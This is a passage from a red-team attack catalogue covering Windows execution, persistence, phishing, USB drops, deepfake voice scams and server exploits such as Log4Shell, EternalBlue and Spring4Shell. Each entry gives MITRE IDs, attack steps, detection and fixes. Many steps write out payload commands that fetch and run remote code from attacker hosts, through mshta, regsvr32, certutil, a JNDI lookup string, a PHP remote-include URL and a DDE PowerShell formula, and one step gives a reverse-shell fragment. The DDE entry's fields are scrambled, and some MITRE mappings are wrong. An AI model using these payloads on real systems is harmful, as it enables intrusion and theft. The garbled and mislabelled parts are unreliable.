- **Detection**: RDP logs, unauthorized user login events
- **Solution**: Disable RDP, enforce RDP whitelisting
- **Tags**: #RDPBackdoor #USBRemoteAccess #RedTeam #MITRE_T1021_001

## USB Exploits DLL Search Order Hijacking

- **Attack Type**: DLL Injection via Application Hijack
- **Target**: Windows Users
- **Vulnerability**: DLL path precedence in Windows
- **MITRE**: T1574.001 – DLL Search Order Hijacking
- **Impact**: Code execution with trusted app disguise
- **Tools**: Malicious DLL, Legit App, PEStudio
- **Scenario**: Drops malicious DLL that hijacks trusted application path (e.g., VLC), executing code on app start.
- **Attack Steps**: 1. Place a legitimate EXE (e.g., vlc.exe) and malicious libvlc.dll on USB.2. When user runs EXE from USB, OS loads DLL from current directory first.3. Malicious DLL contains payload that launches attacker’s code (e.g., reverse shell, keylogger).4. User sees normal VLC window but is already compromised.5. Often used in physical social engineering drops.
- **Detection**: DLL load monitoring, application hash mismatch
- **Solution**: Restrict execution from USB, enable DLL Safe Search
- **Tags**: #DLLHijack #USBDrop #InjectionAttack #RedTeam #MITRE_T1574_001

## Fake Antivirus SMS – Credential Harvesting

- **Attack Type**: SMS Phishing (Smishing)
- **Target**: Mobile Users
- **Vulnerability**: Trust in SMS, lack of verification
- **MITRE**: T1566.001 – Spearphishing via Service
- **Impact**: Credential theft, account takeover
- **Tools**: SMS Gateway, Ngrok, SEToolkit
- **Scenario**: SMS claims the user's system is infected and asks to click a link to “scan” and login.
- **Attack Steps**: 1. Attacker sets up a cloned login page using SET.2. Uses SMS gateway to send messages like “🛑 Virus detected on your phone! Scan now: [link]”.3. Link leads to fake security login portal.4. When victim logs in, credentials are harvested.5. Can escalate to full account compromise.
- **Detection**: SMS log monitoring, fake domain detection
- **Solution**: Educate users, block suspicious links in SMS
- **Tags**: #Smishing #CredentialHarvesting #MITRE_T1566_001 #InitialAccess

## Deepfake CEO Voice Call Scam

- **Attack Type**: Voice Phishing (Vishing)
- **Target**: Finance/IT Staff
- **Vulnerability**: Trust in voice, no verification protocol
- **MITRE**: T1566.004 – Vishing
- **Impact**: Credential or financial theft
- **Tools**: Descript, ElevenLabs, VOIP software
- **Scenario**: Attacker uses AI-generated voice to impersonate CEO and request urgent action.
- **Attack Steps**: 1. Attacker trains AI model on CEO’s past interviews.2. Spoofs caller ID and uses AI-generated voice to call employee.3. Requests wire transfer or VPN access.4. Target complies under pressure.5. Credentials or money transferred without verification.
- **Detection**: Call logs, anomalous transactions
- **Solution**: Enforce callback verification, train employees
- **Tags**: #DeepfakeVishing #AIPhishing #VoiceAttack #MITRE_T1566_004

## Spear Phishing with LinkedIn Profile Spoof

- **Attack Type**: Highly-Targeted Email Bait
- **Target**: Corporate Employees
- **Vulnerability**: Trust in recruiter outreach
- **MITRE**: T1566.002 – Spearphishing Link
- **Impact**: Credential theft, lateral access
- **Tools**: LinkedIn, Google Docs, Email Template
- **Scenario**: Attacker uses fake LinkedIn profile posing as a recruiter, sends tailored phishing email with malicious link.
- **Attack Steps**: 1. Create fake LinkedIn profile mimicking real recruiter.2. Connect with target.3. Email target: “We reviewed your profile for a senior role, view job brief here”.4. Link leads to credential harvester page cloned from Google login.5. Target logs in, credentials are captured.
- **Detection**: Email link analysis, DLP logs
- **Solution**: Train users, implement anti-spoofing email rules
- **Tags**: #SpearPhishing #LinkedInSpoof #RecruitmentScam #MITRE_T1566_002

## Fake Flash Player Update via Pop-Up

- **Attack Type**: Social Engineering Download
- **Target**: General Web Users
- **Vulnerability**: Fake update trust, out-of-date controls
- **MITRE**: T1189 – Drive-By Compromise
- **Impact**: Full device compromise, persistence
- **Tools**: Browser Exploit, Payload Dropper
- **Scenario**: Pop-up on compromised site urges user to install “Flash update”, which is actually malware.
- **Attack Steps**: 1. Compromise ad network or inject JS into site.2. Trigger pop-up: “Flash Player outdated – Click to update”.3. Download link delivers EXE with embedded backdoor.4. User installs believing it’s official.5. Malware executes silently and maintains persistence.
- **Detection**: Web proxy logs, binary analysis
- **Solution**: Block pop-ups, restrict software installation
- **Tags**: #DriveBy #FakeUpdate #UserDeception #MITRE_T1189

## USB Labeled “Salary_Package_2024” with Ransomware

- **Attack Type**: Bait File with Malware
- **Target**: Employees
- **Vulnerability**: Curiosity, hidden file extensions
- **MITRE**: T1204.002 – User Execution (USB EXE)
- **Impact**: Data loss, ransomware infection
- **Tools**: EXE Binder, Ransomware Payload
- **Scenario**: USB dropped in cafeteria contains a file named to attract attention, launching ransomware on execution.
- **Attack Steps**: 1. Name file “Salary_Package_2024.pdf.exe”.2. Configure to show decoy PDF while installing ransomware.3. Drop USB in common areas.4. Employee runs file out of curiosity.5. Payload encrypts files and shows ransom note.
- **Detection**: Monitor for new USB devices, file behavior logs
- **Solution**: Train users, block executable from USB drives
- **Tags**: #USBPayload #RansomwareDrop #MITRE_T1204_002

## Vendor Portal Credential Theft via Phishing

- **Attack Type**: Phishing via Partner Portal
- **Target**: Vendor Employees
- **Vulnerability**: Weak vendor security, shared credentials
- **MITRE**: T1199 – Trusted Relationship
- **Impact**: Lateral compromise via supply chain
- **Tools**: Phishing Kit, Recon Tools
- **Scenario**: Attacker targets a vendor’s weak portal and uses stolen credentials to access client system.
- **Attack Steps**: 1. Identify vendors integrated with target (e.g., IT support).2. Phish vendor employee with fake login page mimicking partner portal.3. Steal credentials and access client system via vendor VPN or API.4. Enumerate internal network and move laterally.
- **Detection**: Monitor partner logins, vendor behavior anomalies
- **Solution**: Use vendor access segmentation, MFA for all vendors
- **Tags**: #ThirdPartyPhishing #VendorCompromise #MITRE_T1199

## Watering Hole Attack via Developer Forum

- **Attack Type**: Compromised Niche Site Delivery
- **Target**: Software Engineers
- **Vulnerability**: Trust in niche blogs, outdated plugins
- **MITRE**: T1189 – Drive-By Compromise
- **Impact**: Stealth infection in technical staff
- **Tools**: JS Injector, Obfuscated Loader
- **Scenario**: Attacker compromises a developer blog to deliver malware to visiting engineers.
- **Attack Steps**: 1. Gain access to a known software blog (via WP vuln or stolen creds).2. Inject obfuscated JS loader.3. When developer visits, loader drops malware (e.g., post-exploitation tool).4. Exploits vulnerable browser plugin (e.g., old PDF viewer).5. No user interaction needed.
- **Detection**: Threat hunting, fileless malware detection
- **Solution**: Regular patching, behavior-based threat detection
- **Tags**: #WateringHole #DevTargeting #StealthAttack #MITRE_T1189

## PowerShell Reverse Shell Execution

- **Attack Type**: Scripted Payload via PowerShell
- **Target**: Windows Systems
- **Vulnerability**: PowerShell unrestricted execution
- **MITRE**: T1059.001 – PowerShell
- **Impact**: Full control of compromised system
- **Tools**: PowerShell, Cobalt Strike, Netcat
- **Scenario**: Executes a reverse shell using encoded PowerShell command post-access.
- **Attack Steps**: 1. Craft PowerShell command: powershell -nop -w hidden -enc <Base64Payload>.2. Drop via phishing, USB, or persistence mechanism.3. Payload connects back to C2 (e.g., Netcat listener or Cobalt Strike beacon).4. Shell provides full system access.5. Often bypasses traditional AV if obfuscated.
- **Detection**: Command-line monitoring, AMSI logs
- **Solution**: Restrict PowerShell usage, enable script-blocking
- **Tags**: #PowerShellAttack #ReverseShell #MITRE_T1059_001

## WMI-Based Malware Execution

- **Attack Type**: Remote Script Execution via WMI
- **Target**: Enterprise Systems
- **Vulnerability**: WMI not audited or restricted
- **MITRE**: T1047 – WMI
- **Impact**: Remote execution with low visibility
- **Tools**: WMIC, Empire, Nishang
- **Scenario**: Executes malware remotely using Windows Management Instrumentation (WMI) to evade detection.
- **Attack Steps**: 1. Use wmic /node:<target> process call create "cmd.exe /c payload.exe" to execute remotely.2. Payload spawns beacon to C2.3. Leaves minimal logs compared to remote desktop or PsExec.4. Can chain with privilege escalation for further persistence.
- **Detection**: WMI event logs, remote execution triggers
- **Solution**: Audit WMI calls, restrict admin access
- **Tags**: #WMIAttack #LateralMovement #MITRE_T1047

## MSHTA Executes Remote HTML Application (HTA)

- **Attack Type**: HTML Application Abuse
- **Target**: Windows Workstations
- **Vulnerability**: mshta.exe trusted & allowed in enterprise
- **MITRE**: T1218.005 – Signed Binary Proxy Execution
- **Impact**: Payload runs under trusted process
- **Tools**: MSHTA.exe, HTA Loader, Pastebin
- **Scenario**: Executes malicious HTA script using mshta.exe, often via phishing or embedded script.
- **Attack Steps**: 1. Host malicious script on remote server or Pastebin.2. Deliver payload: mshta http://evil.com/payload.hta.3. Script runs via trusted binary (mshta.exe).4. Drops backdoor or ransomware silently.5. Often bypasses AV as mshta is signed by Microsoft.
- **Detection**: Monitor mshta usage, parent-child process chains
- **Solution**: Block mshta.exe, enforce signed-script policies
- **Tags**: #MSHTAExploit #HTAExecution #SignedBinaryAbuse #MITRE_T1218_005

## Execution via Scheduled Task

- **Attack Type**: Scheduled Script Execution
- **Target**: Domain-Joined PCs
- **Vulnerability**: Lack of task auditing
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Stealthy, repeated execution of malware
- **Tools**: schtasks.exe, Empire, Cobalt Strike
- **Scenario**: Attacker creates scheduled task to execute payload at system startup or regular interval.
- **Attack Steps**: 1. Use: schtasks /create /tn "Update" /tr "cmd.exe /c payload.bat" /sc minute /mo 30.2. Task runs with system privileges.3. Payload connects to C2.4. Can be combined with persistence for long-term access.5. Effective on systems with poor scheduled task hygiene.
- **Detection**: Monitor new tasks, look for non-standard names
- **Solution**: Enforce task approval policies, block user tasks
- **Tags**: #ScheduledTaskAbuse #Persistence #MITRE_T1053_005

## Malicious JavaScript via .js File Execution

- **Attack Type**: Script Execution (User Double-Click)
- **Target**: End Users
- **Vulnerability**: Windows Script Host enabled
- **MITRE**: T1059.007 – JavaScript
- **Impact**: Execution under user context, remote control
- **Tools**: JScript, Obfuscator, Windows Script Host
- **Scenario**: Attacker delivers .js file that runs a malicious script on execution by the user.
- **Attack Steps**: 1. Create .js payload with reverse shell using WScript.2. Obfuscate code using hex encoding.3. Drop via phishing email or USB drive.4. When user double-clicks, Windows Script Host executes it.5. Payload opens C2 channel.
- **Detection**: Monitor .js executions, WSH usage
- **Solution**: Block WSH, filter unknown .js files in email
- **Tags**: #JSExploit #UserExecution #MITRE_T1059_007

## DLL Side-Loading via Trusted App

- **Attack Type**: DLL Hijacking via Search Order Abuse
- **Target**: Any Windows Host
- **Vulnerability**: DLL load order not secured
- **MITRE**: T1574.001 – DLL Search Order Hijacking
- **Impact**: Stealth execution using trusted app
- **Tools**: Legit App (e.g., VLC), Malicious DLL
- **Scenario**: Executes malicious DLL using vulnerable application that loads DLLs from local directory first.
- **Attack Steps**: 1. Identify application with DLL load order vulnerability (e.g., VLC, Chrome).2. Rename malicious DLL to match expected library (e.g., libvlc.dll).3. Place app and DLL in same folder on target.4. On execution, app loads malicious DLL.5. Payload runs under app's process context.
- **Detection**: DLL load monitoring, app behavior analysis
- **Solution**: Restrict DLL search paths, code signing required
- **Tags**: #DLLHijack #SearchOrderAbuse #MITRE_T1574_001

## Execution via Compiled HTA + AutoRun

- **Attack Type**: Autorun Execution with HTA Payload
- **Target**: Legacy Systems
- **Vulnerability**: Autorun enabled, HTA not blocked
- **MITRE**: T1059 – Command & Scripting Interpreter
- **Impact**: Legacy system compromise
- **Tools**: HTA Generator, USB Creator, Registry Editor
- **Scenario**: Attacker places malicious HTA file on USB that auto-executes on legacy systems with autorun enabled.
- **Attack Steps**: 1. Create HTA file with embedded VBScript/Payload.2. Add autorun.inf pointing to HTA file.3. Drop on USB.4. On legacy systems (e.g., Windows 7), payload executes when inserted.5. Gains shell access or installs persistence script.
- **Detection**: USB autorun logs, HTA file detection
- **Solution**: Disable autorun, upgrade legacy systems
- **Tags**: #HTAAutorun #USBExecution #LegacyExploit #MITRE_T1059

## Execution via Microsoft Office Macros

- **Attack Type**: Macro Payload in Office Document
- **Target**: Office Users
- **Vulnerability**: Macros enabled, user curiosity
- **MITRE**: T1059.005 – Visual Basic
- **Impact**: Remote shell, malware delivery
- **Tools**: VBA, Word/Excel, Empire, Obfuscator
- **Scenario**: Malicious macros embedded in Word or Excel execute payload when user enables macros.
- **Attack Steps**: 1. Embed VBA macro into .docm or .xlsm file.2. Macro executes PowerShell payload on macro-enable.3. Deliver via phishing email with convincing message.4. User opens and enables macros.5. Payload connects to attacker’s C2 or drops malware.
- **Detection**: Monitor macro-enabled files, EDR alerts
- **Solution**: Disable macros by default, use macro signing
- **Tags**: #OfficeMacroExploit #VBAPayload #MITRE_T1059_005

## Execution via Regsvr32 and Remote COM Scriptlet

- **Attack Type**: COM Hijacking via Regsvr32
- **Target**: Windows Hosts
- **Vulnerability**: Trust in signed tools, no .sct validation
- **MITRE**: T1218.010 – Regsvr32 Proxy Execution
- **Impact**: Remote script execution, stealth execution
- **Tools**: Regsvr32, .sct script, HTTP Server
- **Scenario**: Uses Regsvr32.exe to execute remotely hosted COM scriptlet (.sct file), bypassing traditional defenses.
- **Attack Steps**: 1. Create malicious .sct file hosted online.2. Execute via: regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll.3. Trusted Windows binary loads and executes remote payload.4. No local file drop needed.5. Often bypasses AV due to use of signed tool.
- **Detection**: Monitor regsvr32 activity and outbound calls
- **Solution**: Block regsvr32 or restrict remote loading
- **Tags**: #Regsvr32Hack #ScriptletExecution #MITRE_T1218_010

## Execution via MSBuild and Inline Task Payload

- **Attack Type**: Signed Binary + XML Payload Abuse
- **Target**: Dev Environments
- **Vulnerability**: MSBuild trusted binary, no scanning
- **MITRE**: T1127.001 – MSBuild Execution
- **Impact**: Stealthy payload in memory
- **Tools**: MSBuild, C# Shellcode, XML Stager
- **Scenario**: Uses MSBuild.exe to compile and run inline XML with C# payload, evading AV.
- **Attack Steps**: 1. Write malicious C# in XML format using MSBuild schema.2. Run using: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.xml.3. Payload executes in memory.4. No binary dropped to disk.5. Bypasses AV relying on file signatures.
- **Detection**: Monitor MSBuild invocation, restrict .xml loading
- **Solution**: Disable MSBuild if unused, audit build tools
- **Tags**: #MSBuildExploit #XMLPayload #MITRE_T1127_001

## Winlogon Helper DLL Injection

- **Attack Type**: Persistence via Logon Helper
- **Target**: Workstations
- **Vulnerability**: Lack of DLL path monitoring
- **MITRE**: T1547.001 – Winlogon Helper DLL
- **Impact**: Persistent code execution post-reboot
- **Tools**: Malicious DLL, Registry Editor
- **Scenario**: Attacker places malicious DLL into Winlogon registry helper to execute at every logon.
- **Attack Steps**: 1. Place payload DLL in trusted system folder.2. Modify registry: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\<key>.3. DLL gets executed with system privileges on each logon.4. Used for persistence and stealth.
- **Detection**: Registry monitoring, DLL behavior logging
- **Solution**: Monitor Winlogon registry keys, block unknown DLLs
- **Tags**: #WinlogonHijack #Persistence #MITRE_T1547_001

## Execution via Windows Task Service DLL Hijack

- **Attack Type**: Service DLL Path Hijacking
- **Target**: Admin Workstation
- **Vulnerability**: DLL location writable to user
- **MITRE**: T1574.002 – DLL Side-Loading
- **Impact**: Code executed under trusted service context
- **Tools**: Malicious DLL, Sysinternals Tools
- **Scenario**: Replaces DLL used by Windows task with malicious one to gain execution.
- **Attack Steps**: 1. Identify vulnerable service with writable DLL path (e.g., task scheduler plug-in).2. Replace DLL with payload.3. On task execution, malicious DLL is loaded.4. Exploit can persist or escalate privileges.
- **Detection**: Monitor service binaries, hash changes
- **Solution**: Lock down service DLL paths, integrity checks
- **Tags**: #ServiceDLLHijack #Persistence #MITRE_T1574_002

## Execution via Explorer Shell Extension DLL

- **Attack Type**: Explorer Plugin Hijack
- **Target**: Desktop Users
- **Vulnerability**: Shell extensions auto-loaded
- **MITRE**: T1546.009 – Explorer Hook
- **Impact**: Persistent stealth execution
- **Tools**: Registry Tool, Malicious DLL
- **Scenario**: Malicious DLL registered as shell extension is loaded whenever Explorer starts.
- **Attack Steps**: 1. Create DLL payload mimicking Explorer shell handler.2. Add registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved.3. Payload DLL is loaded automatically on user session start.4. Execution happens every time Explorer starts.
- **Detection**: Registry change monitoring, shell extension logs
- **Solution**: Use allowlist for shell extensions
- **Tags**: #ExplorerHijack #ShellPersistence #MITRE_T1546_009

## Script Execution via Signed MSI Installer

- **Attack Type**: MSI Dropper Execution
- **Target**: Any Windows System
- **Vulnerability**: MSI format trusted by default
- **MITRE**: T1218.007 – MSIExec Execution
- **Impact**: Remote shell or malware deployed
- **Tools**: MSI Editor, PowerShell, Windows Installer
- **Scenario**: Uses .msi installer with embedded script or EXE payload to bypass script detection policies.
- **Attack Steps**: 1. Create MSI package with embedded PowerShell or EXE.2. Deliver via phishing or download.3. User runs MSI thinking it's legitimate.4. Payload is dropped and executed silently.5. Leverages trust in MSI format.
- **Detection**: Monitor msiexec activity and unknown installers
- **Solution**: Block unsigned MSIs or restrict execution policy
- **Tags**: #MSIExploit #SignedInstallerAbuse #MITRE_T1218_007

## Remote Service Execution via PsExec

- **Attack Type**: Lateral Movement Execution
- **Target**: Domain Systems
- **Vulnerability**: Shared admin credentials
- **MITRE**: T1021.002 – PsExec
- **Impact**: Remote execution, lateral compromise
- **Tools**: PsExec, Mimikatz, Beacon Stager
- **Scenario**: Attacker uses PsExec to execute a binary remotely on a target machine using admin credentials.
- **Attack Steps**: 1. Steal credentials via phishing or Mimikatz.2. Upload PsExec to attacker system.3. Run: PsExec \\target cmd.exe /c payload.exe.4. Payload spawns shell or C2 beacon.5. Leaves logs in admin shares and Event Logs.
- **Detection**: Admin share logs, PsExec usage monitoring
- **Solution**: Restrict PsExec, enforce unique credentials
- **Tags**: #PsExecExploit #LateralMovement #MITRE_T1021_002

## Execution via LOLBins (Living-Off-the-Land Binaries)

- **Attack Type**: Living-Off-the-Land Abuse
- **Target**: Windows Users
- **Vulnerability**: Blind trust in OS-signed binaries
- **MITRE**: T1218 – Signed Binary Proxy Execution
- **Impact**: Bypasses defenses, executes malicious code
- **Tools**: Certutil, Bitsadmin, Cmd, PowerShell
- **Scenario**: Uses trusted OS tools (e.g., certutil, bitsadmin) to download and run payloads.
- **Attack Steps**: 1. Use certutil -urlcache -f http://attacker/file.exe file.exe to download.2. Execute with start file.exe.3. Trusted binaries avoid AV detection.4. Used in fileless malware attacks.
- **Detection**: Monitor unusual command-line activity
- **Solution**: Block use of known LOLBins, script restrictions
- **Tags**: #LOLBins #LivingOffLand #Certutil #MITRE_T1218

## HTA Execution via Embedded Email Object

- **Attack Type**: HTML Application via Email Embedding
- **Target**: Office Workers
- **Vulnerability**: HTA support in email clients
- **MITRE**: T1204.002 – User Execution
- **Impact**: Stealth payload execution via email
- **Tools**: HTA, Outlook, JavaScript
- **Scenario**: HTML emails embed malicious HTA objects that execute if previewed in Outlook or opened in IE.
- **Attack Steps**: 1. Craft email with embedded HTA object.2. When opened in Outlook or IE, object triggers mshta.exe.3. Runs malicious script from local or remote.4. Launches payload with same privileges as user.
- **Detection**: Disable HTA support in email clients
- **Solution**: Block mshta.exe, restrict HTML object rendering
- **Tags**: #HTAinEmail #UserExecution #MITRE_T1204_002

## Malicious Shortcut (.lnk) File Execution

- **Attack Type**: Weaponized LNK File
- **Target**: End Users
- **Vulnerability**: LNK files executed without suspicion
- **MITRE**: T1204.002 – User Execution
- **Impact**: Fileless or script-based payload execution
- **Tools**: LNK Creator, PowerShell, Icon Spoofer
- **Scenario**: Attacker delivers a .lnk shortcut file pointing to hidden malicious script or binary.
- **Attack Steps**: 1. Craft .lnk file pointing to cmd.exe /c payload.ps1.2. Spoof icon and description (e.g., “Project Report.lnk”).3. Send via email or USB drop.4. On user click, PowerShell script executes silently.5. Can chain with downloader or persistence.
- **Detection**: Monitor .lnk execution events, behavior logs
- **Solution**: Restrict shortcut file execution, file extension visibility
- **Tags**: #LNKExploit #ShortcutHack #MITRE_T1204_002

## Malicious Excel Formula with DDE

- **Attack Type**: Dynamic Data Exchange Exploit
- **Target**: /c powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x')'!A1`.2. Send to user via phishing.3. User opens and sees prompt, clicks “Yes”.4. PowerShell script is executed.
- **Vulnerability**: Office Users
- **MITRE**: DDE links auto-prompt in legacy Excel versions
- **Impact**: T1203 – Exploitation for Client Execution
- **Tools**: Excel, DDE Command, PowerShell
- **Scenario**: Attacker uses Excel formula with =DDE command to launch system commands without macros.
- **Attack Steps**: 1. Create Excel with formula: `=cmd
- **Detection**: Command-line payload runs silently
- **Solution**: Monitor DDE prompts, disable legacy support
- **Tags**: Disable DDE, use Protected View

## Malicious Batch Script Triggered via File Association

- **Attack Type**: File Association Hijack
- **Target**: Windows Users
- **Vulnerability**: Weak file association integrity
- **MITRE**: T1546.001 – Event Trigger Execution
- **Impact**: Covert persistent execution
- **Tools**: Registry Editor, .bat File, PowerShell
- **Scenario**: Hijacks .txt file association to execute payload when user opens a text file.
- **Attack Steps**: 1. Modify registry to associate .txt with malicious batch file.2. Payload is executed whenever user opens any .txt file.3. Script runs under user privileges.4. Restores original behavior post-execution if needed for stealth.
- **Detection**: File association changes, execution tracing
- **Solution**: Lock down file associations via GPO
- **Tags**: #FileAssociationAbuse #ExecutionHijack #MITRE_T1546_001

## Java Web Applet Execution via Legacy Browser

- **Attack Type**: Remote Execution via Signed Applet
- **Target**: Legacy Users
- **Vulnerability**: Java plugin still enabled in old browsers
- **MITRE**: T1203 – Client Exploitation
- **Impact**: Full system compromise in outdated environments
- **Tools**: Java Applet, Burp Suite, IE8
- **Scenario**: Attacker delivers signed Java applet through a webpage to execute code in older browsers.
- **Attack Steps**: 1. Host malicious signed applet with payload.2. Lure user to visit the site (phishing or redirect).3. In browsers with Java plugin (IE 8, Firefox), user is prompted to run applet.4. Upon approval, applet executes code like PowerShell or system calls.
- **Detection**: Web activity logs, plugin detection
- **Solution**: Remove Java plugins, block outdated browsers
- **Tags**: #JavaAppletExploit #BrowserAbuse #MITRE_T1203

## Log4Shell Exploit on Exposed Web Server

- **Attack Type**: Java Deserialization Exploit (JNDI)
- **Target**: Java Web Servers
- **Vulnerability**: Unpatched Log4j 2.x logging library
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: Full remote code execution, server takeover
- **Tools**: JNDIExploitKit, Burp Suite, LDAP
- **Scenario**: Exploits vulnerable Log4j logging to trigger RCE via JNDI injection.
- **Attack Steps**: 1. Identify system running Log4j (e.g., Apache, Minecraft).2. Send payload: ${jndi:ldap://attacker.com/exploit} in HTTP header.3. Log4j resolves LDAP, fetches remote class.4. Remote Java code is executed on victim.5. Attacker gains remote shell.
- **Detection**: Network logs, class loading anomalies
- **Solution**: Update Log4j version, restrict JNDI/LDAP access
- **Tags**: #Log4Shell #JavaExploit #JNDIInjection #MITRE_T1210

## EternalBlue SMB RCE

- **Attack Type**: SMB Buffer Overflow
- **Target**: Windows 7/8 Servers
- **Vulnerability**: Unpatched SMBv1 protocol stack
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: SYSTEM shell access, lateral movement
- **Tools**: Metasploit, Nmap, MSFconsole
- **Scenario**: Uses MS17-010 (EternalBlue) to exploit vulnerable SMBv1 servers and run arbitrary code.
- **Attack Steps**: 1. Scan for open SMBv1 ports using Nmap.2. Load EternalBlue module in Metasploit.3. Set RHOST and payload (e.g., Meterpreter).4. Launch exploit – buffer overflow triggers NT AUTHORITY shell.5. Move laterally via shell.
- **Detection**: SMB traffic, exploit signatures in EDR logs
- **Solution**: Apply MS17-010 patch, disable SMBv1
- **Tags**: #EternalBlue #SMBExploit #MS17_010 #MITRE_T1210

## Remote RDP Exploit – BlueKeep (CVE-2019-0708)

- **Attack Type**: RDP Use-After-Free Exploit
- **Target**: Legacy RDP Servers
- **Vulnerability**: RDP service with CVE-2019-0708
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: Full control without authentication
- **Tools**: BlueKeep Scanner, Python Exploit
- **Scenario**: Attacker exploits vulnerable Remote Desktop Protocol (RDP) to execute shellcode on target machine.
- **Attack Steps**: 1. Scan for open RDP (port 3389) on Windows 7/Server 2008 systems.2. Send crafted sequence of packets triggering memory corruption.3. Use shellcode injection to get remote Meterpreter shell.4. System compromised silently without login prompt.
- **Detection**: RDP traffic anomalies, memory exception logs
- **Solution**: Patch CVE-2019-0708, disable unused RDP
- **Tags**: #BlueKeep #RDPExploit #UnauthAccess #MITRE_T1210

## PHP Remote File Inclusion (RFI)

- **Attack Type**: Remote Include via PHP Input
- **Target**: Web Servers
- **Vulnerability**: Unvalidated include statements
- **MITRE**: T1190 – Exploit Public App
- **Impact**: Shell access, website defacement or control
- **Tools**: Ngrok, Netcat, PHP Exploit Server
- **Scenario**: Attacker injects external URL into PHP include function to fetch and run malicious code.
- **Attack Steps**: 1. Locate PHP app using include($_GET['page']) without sanitization.2. Host web shell (e.g., shell.txt) on attacker server.3. Send payload: http://victim.com/index.php?page=http://attacker.com/shell.txt.4. Web server executes attacker’s shell.
- **Detection**: Web server logs, code integrity checks
- **Solution**: Sanitize user input, disable remote includes
- **Tags**: #PHPExploit #RemoteInclude #WebShell #MITRE_T1190

## Apache Struts RCE (CVE-2017-5638) via Content-Type

- **Attack Type**: OGNL Injection via HTTP Header
- **Target**: Apache Struts Servers
- **Vulnerability**: Vulnerable OGNL expression parsing
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: Remote shell, server command execution
- **Tools**: Burp Suite, Exploit.py, Netcat
- **Scenario**: Sends crafted Content-Type header that exploits OGNL processing in Apache Struts to gain shell.
- **Attack Steps**: 1. Identify Apache Struts endpoint (usually REST API or upload page).2. Send POST request with malicious Content-Type header: Content-Type: %{(#_='multipart/form-data').(#cmd='calc').(...)}3. OGNL expression is parsed and executed.4. Remote shell or system commands executed.
- **Detection**: Web logs, payload signature analysis
- **Solution**: Patch Apache Struts, disable OGNL parsing
- **Tags**: #ApacheStrutsExploit #OGNLInjection #MITRE_T1210

## Spring4Shell RCE on Spring Core (CVE-2022-22965)

- **Attack Type**: Java Parameter Binding Exploit
- **Target**: Java Web Apps
- **Vulnerability**: Unpatched Spring Core with Tomcat
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: Server compromise via shell, persistent access
- **Tools**: Burp Suite, Curl, Netcat, SpringExploit
- **Scenario**: Exploits Spring Framework to write and execute web shell on servers running vulnerable configurations.
- **Attack Steps**: 1. Identify Spring Boot app with Tomcat + Java 9+.2. Send crafted HTTP POST with malicious parameters to bind internal fields.3. Write JSP shell to webroot using crafted input.4. Access shell via browser or Netcat.5. Full RCE with web server context.
- **Detection**: Webshell detection, file monitoring
- **Solution**: Patch Spring Core, apply WAF rules
- **Tags**: #Spring4Shell #JavaRCE #SpringCoreExploit #MITRE_T1210

## Deserialization RCE in .NET BinaryFormatter

- **Attack Type**: .NET Gadget Chain Injection
- **Target**: .NET Web Apps
- **Vulnerability**: Unsafe deserialization of untrusted input
- **MITRE**: T1131 – Application Layer Protocol
- **Impact**: Remote command execution via serialization flaw
- **Tools**: ysoserial.net, DotPeek, Netcat
- **Scenario**: Exploits unsafe deserialization in .NET apps using BinaryFormatter to execute commands.
- **Attack Steps**: 1. Find exposed endpoint that uses BinaryFormatter.Deserialize().2. Use ysoserial.net to generate malicious payload.3. Send payload to vulnerable endpoint.4. App deserializes and executes attacker-controlled code.5. Opens reverse shell.
- **Detection**: Deep packet inspection, custom protocol logs
- **Solution**: Use safe serializers, validate input
- **Tags**: #NETDeserialization #BinaryFormatterExploit #MITRE_T1131

## Jenkins Script Console RCE (Authenticated)

- **Attack Type**: Groovy Script Execution
- **Target**: CI/CD Servers
- **Vulnerability**: Exposed script console to authenticated users
- **MITRE**: T1059 – Command & Script Interpreter
- **Impact**: Full system access from Jenkins service
- **Tools**: Jenkins, Groovy Console, Metasploit
- **Scenario**: Authenticated attacker executes Groovy scripts via Jenkins script console.
- **Attack Steps**: 1. Gain Jenkins credentials via brute force or social engineering.2. Navigate to /script endpoint.3. Execute: def cmd = 'whoami'.execute(); println cmd.text.4. Use for lateral movement or C2 download.5. Root-level access if Jenkins runs as root.
- **Detection**: Monitor Jenkins script console usage
- **Solution**: Restrict console access, enable role-based control
- **Tags**: #JenkinsExploit #GroovyRCE #MITRE_T1059

## CVE-2021-21972 – VMware vCenter RCE

- **Attack Type**: File Upload RCE
- **Target**: vCenter Servers
- **Vulnerability**: Unauthenticated file upload vulnerability
- **MITRE**: T1210 – Exploitation of RCE
- **Impact**: Complete server takeover, lateral movement
- **Tools**: Exploit.py, Netcat, Burp Suite
- **Scenario**: Exploits unauthenticated file upload flaw in vSphere Client plugin to run code as root.
- **Attack Steps**: 1. Target vCenter v7.x or 6.7 with plugin /ui exposed.2. Upload malicious .jsp to web directory using crafted POST.3. Access via /ui/vcwebapps/shell.jsp.4. Payload executes as root on vulnerable vCenter.5. Can pivot into ESXi or internal VLAN.
- **Detection**: File integrity monitoring, plugin audit logs
- **Solution**: Patch CVE-2021-21972, WAF rules
- **Tags**: #vCenterExploit #JSPUpload #CVE202121972 #MITRE_T1210

## Python pickle Deserialization in Web API

- **Attack Type**: Insecure Object Deserialization
- **Target**: Python Web APIs
- **Vulnerability**: pickle used on untrusted data
- **MITRE**: T1131 – Application Layer Protocol
- **Impact**: Arbitrary code execution in backend server
- **Tools**: Custom Exploit Script, Flask, Netcat
- **Scenario**: Uses Python’s pickle module to deserialize malicious objects and execute code remotely.
- **Attack Steps**: 1. Locate API using pickle.loads() on user input.2. Craft payload with arbitrary code (os.system('bash -i >& ...')).3. Send payload to endpoint.4. Application executes command with its privileges.5. Attacker gains reverse shell or implants.
- **Detection**: Network inspection, input anomaly detection
- **Solution**: Avoid pickle, use safer serializers (e.g., json)
- **Tags**: #PythonExploit #PickleRCE #MITRE_T1131

## Encoded PowerShell Empire Beacon

- **Attack Type**: Encoded Command Execution via Empire
- **Target**: Windows Servers
- **Vulnerability**: PowerShell unconstrained
